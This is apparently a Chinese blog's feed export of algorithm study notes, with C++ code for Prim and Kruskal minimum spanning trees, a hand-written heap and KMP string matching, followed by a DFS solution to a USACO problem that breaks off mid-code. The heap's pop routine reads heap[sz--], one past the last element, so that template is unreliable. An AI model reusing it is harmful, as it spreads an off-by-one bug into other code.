之后就形成了圈。<br>算了，抄别人的证明太难受了，我说一下自己的想法吧，虽然可能很潦草还有错误但是能理解就行：就是一个无向图，那我们随机取一个点，找这个点所能连的最小的边（为什么能随机取，因为任意一个点所连的最小边一定要取，满足贪心），如果选的最小边会使生成树产生环，则取次小边，直到所有点都被取到。<br>那直接根据我的定义上代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> cost[MAX_V][MAX_V]; <span class="comment">//表示 e=(u,v)的权值，不存在的情况下为INF</span></span><br><span class="line"><span class="type">int</span> mincost[MAX_V];     <span class="comment">//从集合X 出发的边到每个顶点的最小权值</span></span><br><span class="line"><span class="type">bool</span> used[MAX_V];       <span class="comment">//顶点i是否被包含在集合X中</span></span><br><span class="line"><span class="type">int</span> V; <span class="comment">//顶点数</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">prim</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; V; i++)&#123;</span><br><span class="line">mincost[i] = INF;</span><br><span class="line">used[i] = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">mincost[<span class="number">0</span>] = <span class="number">0</span>;  <span class="comment">//由于随机取都行 这里直接拿第一个</span></span><br><span class="line"><span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line"><span class="type">int</span> v = <span class="number">-1</span>; <span class="comment">//从不属于X的顶点选取从x到其权值最小的顶点</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> u = <span class="number">0</span>; u &lt; V; u++)&#123;</span><br><span class="line"><span class="keyword">if</span>(!used[u]&amp;&amp;(v == <span class="number">-1</span> || mincost[u] &lt; mincost[v])) v = u;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(v == <span class="number">-1</span>) <span class="keyword">break</span>;</span><br><span class="line">used[v] = <span class="literal">true</span>;</span><br><span class="line">res += mincost[v];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> u = <span class="number">0</span>;u &lt;V; u++)&#123;</span><br><span class="line">mincost[u] = <span class="built_in">min</span>(mincost[u], cost[v][u]);  <span class="comment">//更新集合X 出发到每个边的最小权值</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="算法2kruskal算法"><a class="markdownIt-Anchor" href="#算法2kruskal算法">#</a> 算法 2（Kruskal 算法）</h4><p>下面是 Kruskal 算法。其是按照边的权值进行排序从小到大，如果不产生圈，就加上这条边。主要就是如何判断加的边是否形成圈（这里似乎可以用并查集的方法–&gt; 如果两个要连接的点属于同一根 则会形成圈 不属于同一根 则可以链接） Kruskal 在边排序较为费时间（边太多可以用 Prim 算法）<br>下面上代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">edge</span>&#123;<span class="type">int</span> u,v,cost;&#125;;</span><br><span class="line"><span class="type">int</span> par[MAX_V],rank[MAX_V];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init_union_find</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;V;i++)&#123;</span><br><span class="line">par[i] = i;</span><br><span class="line">rank[i] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(par[x] == x) <span class="keyword">return</span> x;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">return</span> par[x] = <span class="built_in">find</span>(par[x]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">unite</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span>&#123;</span><br><span class="line">x = <span class="built_in">find</span>(x);</span><br><span class="line">y = <span class="built_in">find</span>(y);</span><br><span class="line"><span class="keyword">if</span>(x == y) <span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">if</span>(rank[x] &lt; rank[y])&#123;</span><br><span class="line">par[x] = y;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">par[y] = x;</span><br><span class="line"><span class="keyword">if</span> (rank[x] == rank[y]) rank[x]++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">same</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">find</span>(x) == <span class="built_in">find</span>(y) ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp</span><span class="params">(<span class="type">const</span> edge&amp; e1,<span class="type">const</span> edge&amp; e2)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> e1.cost &lt; e2.cost;</span><br><span class="line">&#125;</span><br><span class="line">edge es[MAX_E];</span><br><span class="line"><span class="type">int</span> V,E; <span class="comment">//V 定点数 E 边数</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Kruskal</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">sort</span>( es, es+ E, cmp);</span><br><span class="line"><span class="built_in">init_union_find</span>(V);</span><br><span class="line"><span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; E; i++)&#123;</span><br><span class="line">edge e = es[i];</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">same</span>(e.u,e.v))&#123;</span><br><span class="line">res += e.cost;</span><br><span class="line"><span class="built_in">unite</span>(e.u,e.v);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="堆"><a class="markdownIt-Anchor" href="#堆">#</a> 堆</h2><p>【定义】 堆是一棵<strong>完全二叉树</strong>，树种每个结点的值都不小于（或不大于）其左右孩子结点的值。堆其实可以用 STL 库中的优先队列 (priority_queue) 代替。这里给出堆的手打模板。数组实现</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> heap[MAX_N],sz=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">push</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> i =sz++;    <span class="comment">//自己的节点编号</span></span><br><span class="line"><span class="keyword">while</span>(i &gt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="type">int</span> p = (i<span class="number">-1</span>) / <span class="number">2</span>;   <span class="comment">//父亲的节点编号</span></span><br><span class="line"><span class="keyword">if</span>(heap[p] &lt;= x) <span class="keyword">break</span>;   <span class="comment">//如果没有大小颠倒 退出</span></span><br><span class="line">heap[i] = heap[p];     <span class="comment">//把父亲节点的数值放下去，把自己提上去</span></span><br><span class="line">i = p;</span><br><span class="line">&#125;</span><br><span class="line">heap[i] = x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">pop</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> ret = heap[<span class="number">0</span>];   <span class="comment">//最小值</span></span><br><span class="line"><span class="type">int</span> x = heap[sz--];  <span class="comment">//要提到根的数值</span></span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>; <span class="comment">//从根开始向下交换</span></span><br><span class="line"><span class="keyword">while</span>(i * <span class="number">2</span> + <span class="number">1</span> &lt;sz)&#123;</span><br><span class="line"><span class="comment">//比较儿子的值</span></span><br><span class="line"><span class="type">int</span> a = i * <span class="number">2</span> + <span class="number">1</span>, b = i * <span class="number">2</span> + <span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span>(b &lt; sz &amp;&amp; heap[b] &lt; heap[a]) a=b;</span><br><span class="line"><span class="comment">//如果已经没有大小颠倒则退出</span></span><br><span class="line"><span class="keyword">if</span>(heap[a] &gt;= x) <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">//把儿子的数值提上取去</span></span><br><span class="line">heap[i] = heap[a];</span><br><span class="line">i = a;</span><br><span class="line">&#125;</span><br><span class="line">heap[i] = x;</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="kmp算法"><a class="markdownIt-Anchor" href="#kmp算法">#</a> KMP 算法</h2><p>KMP 算法主要用来进行判断两个字符串是否 A 是 B 的子串。暴力的解法十分简单，1 只需要一一枚举文本串的起始位置 i 然后和模式串进行逐位匹配即可。</p><h4 id="next数组"><a class="markdownIt-Anchor" href="#next数组">#</a> next 数组</h4><p>介绍 KMP 算法要先来学习一下 Next 数组。假设有一个字符串 s (下标从 0 开始)，那么它以 i 号位作为结尾的子串就是 s [0…i]。对该子串来说，长度位 k+1 的前缀和后缀分别时 s [0…k] 和 s [i-k…i]。现在定义一个 int 型数组 next，其中<strong> next [i] 表示子串 s [0…i] 的前缀 s [0…k] 等于后缀 s [i-k…i] 的最大的 k (注意前缀和后缀可以部分重叠，但不能是 s [0…i] 本身)</strong> 如果找不到相等的前后缀，那么就令 next [i]= -1。显然，<strong>next [i] 就是所求最长相等前后缀中前缀最后一位的下标。</strong><br>这里可以利用递推来进行 Next 数组的求解。假设已经求出了 next [0]~next [i-1]，现在用它们来推出 next [i]。<br>通过这样可以列出下面伪代码求解过程:</p><ul><li>①初始化 next 数组，令 j = next [0] = -1。</li><li>②让 i 在 1 ~ len -1 范围遍历，对每一个 i，执行③④，求解 next [i]。</li><li>③不断令 j = next [i]，直到 j 回退为 - 1，或者是 s [i] == s [j+1] 成立。</li><li>④如果 s [i] == s [j+1]，则 next [i] = j +1; 否则 next [i] = j。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">getNext</span><span class="params">(<span class="type">char</span> s[], <span class="type">int</span> len)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> j = <span class="number">-1</span>;</span><br><span class="line">next[<span class="number">0</span>] = <span class="number">-1</span>;    <span class="comment">//初始化 j= next[0] = -1</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; len;i++)&#123;   <span class="comment">//求解 next[1] ~ next[len -1]</span></span><br><span class="line"><span class="keyword">while</span>(j != <span class="number">-1</span> &amp;&amp;s[i] != s[j+<span class="number">1</span>])&#123;</span><br><span class="line">j = next[j];   <span class="comment">//反复令 j =next[j]</span></span><br><span class="line">&#125;   <span class="comment">//直到j回退到-1，或是 s[i] == s[j+1]</span></span><br><span class="line"><span class="keyword">if</span>(s[i] == s[j+<span class="number">1</span>])&#123;</span><br><span class="line">j++;</span><br><span class="line">&#125;</span><br><span class="line">next[i] = j;  <span class="comment">//令 next[i] = j</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="kmp算法-2"><a class="markdownIt-Anchor" href="#kmp算法-2">#</a> KMP 算法</h4><p>在上文的基础，利用 next 数组即可进行 KMP 算法求解。这里也知晓了 next 数组的含义 ** 即当 j+1 位失配时，j 应该回退到的位置。由此总结除 KMP 算法的一般思路。</p><ul><li>①初始化 j = -1, 表示 pattern 当前已经被匹配的最后位。</li><li>②让 i 遍历文本串 text，对每一个 i，执行③④来试图匹配 text [i] 和 pattern [j + 1].</li><li>③不断令 j =next [j]，直到 j 回退为 -1，或者 text [i] == pattern [j + 1] 成立。</li><li>④如果 text [i] == pattern [j + 1], 则令 j++。如果 j 达到 m -1 ，则说明 pattern 是 text 的子串。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">KMP</span><span class="params">(<span class="type">char</span> text[], <span class="type">char</span> pattern[])</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n =<span class="built_in">strlen</span>(text), m = <span class="built_in">strlen</span>(pattern);</span><br><span class="line"><span class="built_in">getNext</span>(pattern,m);  <span class="comment">//计算pattern 的next 数组</span></span><br><span class="line"><span class="type">int</span> j=<span class="number">-1</span>;  <span class="comment">//初始化 j = -1 ，表示当前还没有任意一位被匹配</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>; i &lt; n; i++)&#123;   <span class="comment">//视图匹配text[i]</span></span><br><span class="line"><span class="keyword">while</span>(j != <span class="number">-1</span> &amp;&amp; text[i] != pattern[j+<span class="number">1</span>])&#123;</span><br><span class="line">j = next[j];   <span class="comment">//不断回退，直到j 回到 -1 或者 text[i] == pattern[j+1]</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(text[i] == pattern[j+<span class="number">1</span>])&#123;</span><br><span class="line">j++;   <span class="comment">//text[i] 和pattern[j+1] 匹配成功</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(j == m <span class="number">-1</span> )&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码其实和求解 next 数组的代码惊人的相似。<strong>其实，求解 next 数组的过程就是模式串 pattern 进行自我匹配的过程。</strong><br>接着需要考虑 text 中 pattern 串出现的次数。这里考虑的主要是当 pattern 和 text 匹配完成之后，如何进行回退效率最高且不会遗漏解。这时还是利用 next 数组。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">KMP</span><span class="params">(<span class="type">char</span> text[], <span class="type">char</span> pattern[])</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n =<span class="built_in">strlen</span>(text), m = <span class="built_in">strlen</span>(pattern);</span><br><span class="line"><span class="built_in">getNext</span>(pattern,m);  <span class="comment">//计算pattern 的next 数组</span></span><br><span class="line"><span class="type">int</span> ans = <span class="number">0</span>,j =<span class="number">-1</span>;  <span class="comment">//初始化 j = -1 ，表示当前还没有任意一位被匹配</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>; i &lt; n; i++)&#123;   <span class="comment">//视图匹配text[i]</span></span><br><span class="line"><span class="keyword">while</span>(j != <span class="number">-1</span> &amp;&amp; text[i] != pattern[j+<span class="number">1</span>])&#123;</span><br><span class="line">j = next[j];   <span class="comment">//不断回退，直到j 回到 -1 或者 text[i] == pattern[j+1]</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(text[i] == pattern[j+<span class="number">1</span>])&#123;</span><br><span class="line">j++;   <span class="comment">//text[i] 和pattern[j+1] 匹配成功</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(j == m <span class="number">-1</span> )&#123;</span><br><span class="line">ans++;</span><br><span class="line">j = next[j]; <span class="comment">//让j回退到next[j]继续进行匹配</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ans; <span class="comment">//返回成功匹配次数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里对上述的 KMP 算法还有优化空间，</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KMP </tag>
            
            <tag> 学习 </tag>
            
            <tag> 最小生成树 </tag>
            
            <tag> 并查集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DFS--复习</title>
      <link href="/2023/11/13/DFS--%E5%A4%8D%E4%B9%A0/"/>
      <url>/2023/11/13/DFS--%E5%A4%8D%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>先上题目：</p><hr><h1 id="usaco21-健康的荷斯坦奶牛-healthy-holsteins"><a class="markdownIt-Anchor" href="#usaco21-健康的荷斯坦奶牛-healthy-holsteins">#</a> [USACO2.1] 健康的荷斯坦奶牛 Healthy Holsteins</h1><h2 id="题目描述"><a class="markdownIt-Anchor" href="#题目描述">#</a> 题目描述</h2><p>农民 John 以拥有世界上最健康的奶牛为傲。他知道每种饲料中所包含的牛所需的最低的维他命量是多少。请你帮助农夫喂养他的牛，以保持它们的健康，使喂给牛的饲料的种数最少。</p><p>给出牛所需的最低的维他命量，输出喂给牛需要哪些种类的饲料，且所需的饲料剂量最少。</p><p>维他命量以整数表示，每种饲料最多只能对牛使用一次，数据保证存在解。</p><h2 id="输入格式"><a class="markdownIt-Anchor" href="#输入格式">#</a> 输入格式</h2><p>第一行一个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi></mrow><annotation encoding="application/x-tex">v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span>，表示需要的维他命的种类数。<br>第二行 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi></mrow><annotation encoding="application/x-tex">v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span> 个整数，表示牛每天需要的每种维他命的最小量。</p><p>第三行一个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>g</mi></mrow><annotation encoding="application/x-tex">g</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span></span></span></span>，表示可用来喂牛的饲料的种数。<br>下面 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>g</mi></mrow><annotation encoding="application/x-tex">g</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span></span></span></span> 行，第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span> 行表示编号为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span> 饲料包含的各种维他命的量的多少。</p><h2 id="输出格式"><a class="markdownIt-Anchor" href="#输出格式">#</a> 输出格式</h2><p>输出文件只有一行，包括牛必需的最小的饲料种数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span></span></span></span>；后面有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span></span></span></span> 个数，表示所选择的饲料编号（按从小到大排列）。</p><p>如果有多个解，输出饲料序号最小的（即字典序最小）。</p><h2 id="样例-1"><a class="markdownIt-Anchor" href="#样例-1">#</a> 样例 #1</h2><h3 id="样例输入-1"><a class="markdownIt-Anchor" href="#样例输入-1">#</a> 样例输入 #1</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4</span><br><span class="line">100 200 300 400</span><br><span class="line">3</span><br><span class="line">50  50  50  50</span><br><span class="line">200 300 200 300</span><br><span class="line">900 150 389 399</span><br></pre></td></tr></table></figure><h3 id="样例输出-1"><a class="markdownIt-Anchor" href="#样例输出-1">#</a> 样例输出 #1</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2 1 3</span><br></pre></td></tr></table></figure><h2 id="提示"><a class="markdownIt-Anchor" href="#提示">#</a> 提示</h2><p>【数据范围】<br>对于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>100</mn><mi mathvariant="normal">%</mi></mrow><annotation encoding="application/x-tex">100\%</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.80556em;vertical-align:-0.05556em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span><span class="mord">%</span></span></span></span> 的数据，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>v</mi><mo>≤</mo><mn>25</mn></mrow><annotation encoding="application/x-tex">1\le v \le 25</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.78041em;vertical-align:-0.13597em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7719400000000001em;vertical-align:-0.13597em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">5</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>g</mi><mo>≤</mo><mn>15</mn></mrow><annotation encoding="application/x-tex">1\le g \le 15</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.78041em;vertical-align:-0.13597em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8304100000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">5</span></span></span></span>。<br>输入的所有整数在 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>1</mn><mo separator="true">,</mo><mn>1000</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[1,1000]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mclose">]</span></span></span></span> 范围内。</p><p>USACO 2.1</p><p>翻译来自 NOCOW</p><h2 id="题解"><a class="markdownIt-Anchor" href="#题解">#</a> 题解</h2><p>太长时间没有刷题，一些简单的深搜也不太会写了。这题不用剪枝直接暴力即可。<br>每个饲料只有 0，1 两种状态（要或者不要）<br>然后 search (t,s)<br> t 代表选中的饲料，s 代表选中饲料的个数，要么 search (t+1,s) 当前饲料不选，要么 search (t+1,s+1)<br> 选当前饲料，数据量小直接就能 AC</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span> <span class="comment">//懒人最爱的万能头文件 </span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;<span class="comment">//名字空间 </span></span><br><span class="line"><span class="type">int</span> ans[<span class="number">1000</span>];<span class="comment">//这个数组是来存储解的。 </span></span><br><span class="line"><span class="type">int</span> a[<span class="number">1000</span>];<span class="comment">//表示牛每天需要的每种维他命的最小量。 </span></span><br><span class="line"><span class="type">int</span> b[<span class="number">1000</span>][<span class="number">1000</span>];<span class="comment">//每种饲料包含的各种维他命的量的多少。</span></span><br><span class="line"><span class="type">int</span> c[<span class="number">1000</span>];<span class="comment">//每次搜索选的饲料编号 </span></span><br><span class="line"><span class="type">int</span> n,m,minn=<span class="number">100000000</span>;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">pd</span><span class="params">(<span class="type">int</span> x)</span><span class="comment">//这是判断每次选的那些饲料中的维生素之和是不是都大于等于牛每天需要的每种维他命的最小量的函数 </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;=n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>; j&lt;=x; j++)</span><br><span class="line">sum+=b[c[j]][i];<span class="comment">//用一个sum累加 </span></span><br><span class="line"><span class="keyword">if</span>(sum&lt;a[i]) <span 